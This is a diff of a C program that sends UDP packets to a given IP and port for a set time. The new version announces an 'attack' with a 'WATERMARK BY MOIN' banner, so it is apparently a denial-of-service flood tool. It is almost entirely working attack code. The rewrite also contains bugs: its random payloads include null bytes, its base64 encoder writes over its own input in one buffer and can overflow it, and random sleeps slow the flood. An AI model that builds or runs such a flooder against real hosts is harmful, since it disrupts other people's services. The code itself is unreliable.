@@ -2,90 +2,109 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <arpa/inet.h>
 #include <pthread.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
 #include <time.h>
 
-#define NUM_THREADS 10 // Number of threads
-#define MAX_PAYLOAD_SIZE 512 // Maximum payload size
+#define MAX_PAYLOAD_SIZE 2048  // Increased payload size
 
-void usage() {
-    printf("Usage: ./packet_sender ip port time\n");
-    exit(1);
+// Base64 encoding table
+const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+// Function to generate random payload with mixed characters
+void generate_random_payload(char *payload, int size) {
+    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09";
+    for (int i = 0; i < size - 1; i++) {
+        payload[i] = charset[rand() % (sizeof(charset) - 1)];
+    }
+    payload[size - 1] = '\0';
 }
 
-struct thread_data {
-    char *ip;
-    int port;
-    int time;
-};
+// Function to encode the payload in base64
+void base64_encode(char *output, const char *input, size_t length) {
+    int i, j = 0;
+    unsigned char a3[3], a4[4];
+    for (i = 0; i < length; i += 3) {
+        a3[0] = input[i];
+        a3[1] = (i + 1 < length) ? input[i + 1] : 0;
+        a3[2] = (i + 2 < length) ? input[i + 2] : 0;
 
-void generate_random_payload(unsigned char *payload, size_t size) {
-    for (size_t i = 0; i < size; i++) {
-        payload[i] = (unsigned char)(rand() % 256); // Generate raw binary bytes
-    }
-}
+        a4[0] = a3[0] >> 2;
+        a4[1] = ((a3[0] & 0x03) << 4) | (a3[1] >> 4);
+        a4[2] = ((a3[1] & 0x0F) << 2) | (a3[2] >> 6);
+        a4[3] = a3[2] & 0x3F;
 
-void *send_packets(void *arg) {
-    struct thread_data *data = (struct thread_data *)arg;
-    int sock;
-    struct sockaddr_in server_addr;
-    time_t endtime;
-    
-    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
-        perror("Socket creation failed");
-        pthread_exit(NULL);
-    }
-
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(data->port);
-    server_addr.sin_addr.s_addr = inet_addr(data->ip);
-
-    endtime = time(NULL) + data->time;
-    unsigned char payload[MAX_PAYLOAD_SIZE];
-
-    while (time(NULL) <= endtime) {
-        size_t payload_size = (rand() % (MAX_PAYLOAD_SIZE - 64)) + 64; // Random size between 64 and MAX_PAYLOAD_SIZE
-        generate_random_payload(payload, payload_size);
-        
-        if (sendto(sock, payload, payload_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-            perror("Send failed");
-            close(sock);
-            pthread_exit(NULL);
+        for (j = 0; j < 4; j++) {
+            output[(i / 3) * 4 + j] = base64_table[a4[j]];
         }
     }
+    output[(i / 3) * 4] = '\0';
+}
 
-    close(sock);
-    pthread_exit(NULL);
+// Function to simulate random delays between packet sends
+void random_sleep() {
+    int sleep_time = rand() % 1000000;  // Sleep for up to 1 second
+    usleep(sleep_time);
+}
+
+// Function to create a socket and configure server address
+int setup_socket(const char *ip, int port, struct sockaddr_in *server_addr) {
+    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sockfd < 0) {
+        perror("Socket creation failed");
+        exit(EXIT_FAILURE);
+    }
+
+    server_addr->sin_family = AF_INET;
+    server_addr->sin_port = htons(port);
+    if (inet_pton(AF_INET, ip, &server_addr->sin_addr) <= 0) {
+        perror("Invalid address/Address not supported");
+        exit(EXIT_FAILURE);
+    }
+
+    return sockfd;
+}
+
+// Function to send a single packet
+void send_packet(int sockfd, struct sockaddr_in *server_addr, const char *payload) {
+    // Send the base64 encoded payload
+    if (sendto(sockfd, payload, strlen(payload), 0, (struct sockaddr *)server_addr, sizeof(*server_addr)) == -1) {
+        perror("Send failed");
+    }
+    printf("Packet sent: %s\n", payload);
+    random_sleep();  // Introduce random delay between packets
 }
 
 int main(int argc, char *argv[]) {
     if (argc != 4) {
-        usage();
+        fprintf(stderr, "Usage: %s <ip> <port> <time>\n", argv[0]);
+        exit(EXIT_FAILURE);
     }
 
-    char *ip = argv[1];
+    const char *ip = argv[1];
     int port = atoi(argv[2]);
-    int time = atoi(argv[3]);
+    int duration = atoi(argv[3]);
 
-    pthread_t thread_ids[NUM_THREADS];
-    struct thread_data data = {ip, port, time};
+    struct sockaddr_in server_addr;
+    int sockfd = setup_socket(ip, port, &server_addr);
 
-    printf("Sending packets to %s:%d for %d seconds with %d threads\n", ip, port, time, NUM_THREADS);
+    printf("THE WATERMARK BY MOIN Starting attack on %s:%d for %d seconds\n", ip, port, duration);
 
-    for (int i = 0; i < NUM_THREADS; i++) {
-        if (pthread_create(&thread_ids[i], NULL, send_packets, (void *)&data) != 0) {
-            perror("Thread creation failed");
-            exit(1);
-        }
-        printf("Thread %lu created.\n", thread_ids[i]);
+    time_t start_time = time(NULL);
+
+    while (difftime(time(NULL), start_time) < duration) {
+        // Generate and send the payload
+        char payload[MAX_PAYLOAD_SIZE];
+        generate_random_payload(payload, rand() % (MAX_PAYLOAD_SIZE - 1) + 1);  // Random payload size
+        base64_encode(payload, payload, strlen(payload));  // Encode in base64
+
+        // Send the packet
+        send_packet(sockfd, &server_addr, payload);
     }
 
-    for (int i = 0; i < NUM_THREADS; i++) {
-        pthread_join(thread_ids[i], NULL);
-    }
+    printf("\nAttack Finished. Packets sent for %d seconds.\n", duration);
 
-    printf("Packet sending finished.\n");
+    close(sockfd);
     return 0;
 }
